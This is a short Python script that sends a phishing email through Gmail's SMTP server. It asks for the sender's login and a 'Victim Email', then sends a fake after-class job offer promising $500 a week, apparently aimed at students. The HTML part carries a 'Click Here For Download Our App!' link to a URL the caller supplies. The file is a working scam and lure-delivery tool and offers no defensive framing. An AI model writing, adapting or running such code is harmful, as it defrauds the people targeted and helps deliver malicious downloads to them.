import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def send(url):
    sender_email = input("Email to use: ")
    receiver_email = input("Victim Email: ")
    password = input("Password: ")

    message = MIMEMultipart("alternative")
    message["Subject"] = "WORK AFTER CLASSES OFFER ($500 WEEKLY SALARY)"
    message["From"] = sender_email
    message["To"] = receiver_email

    # Create the plain-text and HTML version of your message
    text = "Hello, Are you currently in the US? Here is an opportunity for you to work part time after classes and earn $500 weekly.The job is completely done online and can be completed anytime in the evening/night at home and won't take much of your time daily, you don't have to be online all day and don't need any professional skill to do the job, all you need is just come online before going to bed to forward all order of the day made by agents to the supplier and you are done for the day."
    html = f"<a href='{url}'> Click Here For Download Our App!</a>"
    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")
    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(
            sender_email, receiver_email, message.as_string()
        )
